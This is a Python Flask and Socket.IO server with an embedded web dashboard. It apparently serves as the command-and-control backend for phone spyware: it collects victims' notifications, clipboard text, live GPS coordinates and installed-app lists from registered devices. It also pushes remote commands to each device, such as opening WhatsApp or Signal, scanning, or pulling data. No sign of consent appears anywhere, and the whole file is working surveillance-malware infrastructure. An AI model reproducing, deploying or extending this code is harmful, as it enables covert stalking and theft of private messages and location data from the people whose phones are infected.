from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import json, time, os

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=120)

devices = {}
notifications = []
clipboards = []
app_scans = []
gps_data = []
PANEL = """
<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#0f0;font-family:monospace;padding:10px;font-size:13px}
h1{text-align:center;padding:15px;border-bottom:2px solid #0f0;margin-bottom:15px}
.card{background:#0a0a0a;border:1px solid #0f0;padding:12px;margin:8px 0;border-radius:8px}
.btn{background:#0f0;color:#000;border:none;padding:7px 12px;margin:3px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:11px}
.btn2{background:#ff0;color:#000}.btn3{background:#f00;color:#fff}.btn4{background:#08f;color:#fff}
select{background:#111;border:1px solid #0f0;color:#0f0;padding:6px;margin:3px;border-radius:4px;font-family:monospace}
.data-box{background:#000;border:1px solid #333;padding:10px;max-height:300px;overflow-y:auto;margin:5px 0;font-size:11px;white-space:pre-wrap}
.notif-item{border-left:3px solid #ff0;padding:8px;margin:5px 0;background:#0a0a00}
.gps-item{border-left:3px solid #0ff;padding:8px;margin:5px 0;background:#000a0a}
.clip-item{border-left:3px solid #f0f;padding:8px;margin:5px 0;background:#0a000a}
.tabs{display:flex;flex-wrap:wrap;gap:5px;margin:10px 0}
.tab{background:#111;color:#fff;border:1px solid #333;padding:8px 15px;cursor:pointer;border-radius:5px;font-size:12px}
.tab.active{background:#0f0;color:#000;font-weight:bold}
.tab-content{display:none}
.tab-content.active{display:block}
a{color:#0ff}
</style></head><body>
<h1>📱 Remote Control Panel</h1>
<button class="btn" onclick="location.reload()">🔄 Refresh</button>
<span style="color:#888">| Devices: {{dc}}</span>

<div class="tabs">
<div class="tab active" onclick="showTab('devices')">📱 Devices ({{dc}})</div>
<div class="tab" onclick="showTab('notifications')">🔔 Notifications</div>
<div class="tab" onclick="showTab('gps')">📍 GPS</div>
<div class="tab" onclick="showTab('clipboard')">📋 Clipboard</div>
<div class="tab" onclick="showTab('apps')">📦 Apps</div>
</div>

<div id="devices" class="tab-content active">{{devices_html}}</div>
<div id="notifications" class="tab-content">{{notif_html}}</div>
<div id="gps" class="tab-content">{{gps_html}}</div>
<div id="clipboard" class="tab-content">{{clip_html}}</div>
<div id="apps" class="tab-content">{{apps_html}}</div>

<script>
const socket = io();
socket.on('connect',()=>socket.emit('join_panel'));
function showTab(id){
    document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    event.target.classList.add('active');
}
function cmd(id,action,param=null){
    socket.emit('command',{id,action,param});
}
function cmdApp(id){
    const app=document.getElementById('appSel-'+id).value;
    cmd(id,'open',app);
}
setInterval(()=>location.reload(),8000);
</script>
</body></html>"""
@app.route('/')
def panel():
    dh = ''
    for did,d in devices.items():
        dh += f'''
        <div class="card">
        <b>📱 {did[:10]}</b> | 🌐 {d.get('ip','?')} | 🖥 {d.get('s','?')} | ⏰ {d.get('last','?')}
        <br>
        <select id="appSel-{did}">
        <option value="w">WhatsApp</option><option value="t">Telegram</option>
        <option value="i">Instagram</option><option value="f">Facebook</option>
        <option value="tw">Twitter</option><option value="sn">Snapchat</option>
        <option value="tk">TikTok</option><option value="yt">YouTube</option>
        <option value="ds">Discord</option><option value="sg">Signal</option>
        </select>
        <button class="btn" onclick="cmdApp('{did}')">▶ Open</button>
        <button class="btn btn2" onclick="cmd('{did}','scan')">🔍 Scan</button>
        <button class="btn btn3" onclick="cmd('{did}','apk')">📦 APK</button>
        <button class="btn btn4" onclick="cmd('{did}','gps')">📍 GPS</button>
        <button class="btn" onclick="cmd('{did}','clip')">📋 Clipboard</button>
        <button class="btn" onclick="cmd('{did}','full')">📊 Data</button>
        </div>'''
    
    nh = ''
    for n in notifications[-30:]:
        nh += f'<div class="notif-item"><b>{n.get("title","?")}</b><br>{n.get("body","")}<br><small>{n.get("time","")}</small></div>'
    
    gh = ''
    for g in gps_data[-20:]:
        gh += f'<div class="gps-item">📍 <a href="https://maps.google.com?q={g.get("lat",0)},{g.get("lon",0)}" target="_blank">{g.get("lat","?")},{g.get("lon","?")}</a> | {g.get("time","")}</div>'
    
    ch = ''
    for c in clipboards[-20:]:
        ch += f'<div class="clip-item">📋 {c.get("txt","")[:200]}<br><small>{c.get("time","")}</small></div>'
    
    ah = ''
    for a in app_scans[-10:]:
        ah += f'<div class="data-box">📦 Device: {a.get("id","")[:8]}<br>Installed: {a.get("count",0)} apps<br>{", ".join(a.get("installed",[])[:25])}</div>'
    
    return render_template_string(PANEL,
        dc=len(devices),
        devices_html=dh or '<p style="color:#666">Waiting for devices...</p>',
        notif_html=nh or '<p style="color:#666">No notifications yet...</p>',
        gps_html=gh or '<p style="color:#666">No GPS data...</p>',
        clip_html=ch or '<p style="color:#666">No clipboard data...</p>',
        apps_html=ah or '<p style="color:#666">No app scans...</p>'
    )

@app.route('/collect', methods=['POST'])
def collect():
    d = request.json
    did = d.get('id')
    t = d.get('type')
    p = d.get('payload',{})
    
    if did:
        if did not in devices: devices[did] = {}
        devices[did].update({'ip':request.remote_addr,'last':time.strftime('%H:%M:%S')})
        
        if t == 'full': devices[did].update({'s':p.get('s'),'p':p.get('p')})
        elif t in ['gps','gps_live']:
            p['time'] = time.strftime('%H:%M:%S'); gps_data.append(p)
        elif t == 'clip':
            p['time'] = time.strftime('%H:%M:%S'); clipboards.append(p)
        elif t == 'notif':
            p['time'] = time.strftime('%H:%M:%S'); notifications.append(p)
        elif t == 'apps':
            p['id'] = did; app_scans.append(p)
    
    return jsonify({'ok':True})

@app.route('/push', methods=['POST'])
def push():
    d = request.json
    notifications.append({'title':'Push','body':str(d.get('data','')),'time':time.strftime('%H:%M:%S')})
    return jsonify({'ok':True})

@app.route('/alive', methods=['POST'])
def alive():
    d = request.json
    did = d.get('id')
    if did and did in devices: devices[did]['last'] = time.strftime('%H:%M:%S')
    return jsonify({'ok':True})

@socketio.on('join_panel')
def on_join(): pass

@socketio.on('register')
def on_reg(data):
    did = data.get('id')
    if did:
        join_room(did)
        devices[did] = {'ip':request.remote_addr,'last':time.strftime('%H:%M:%S'),'s':data.get('d',{}).get('s'),'p':data.get('d',{}).get('p')}

@socketio.on('command')
def on_cmd(data):
    did = data.get('id')
    if did: emit('cmd', data, room=did)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT',5000)))
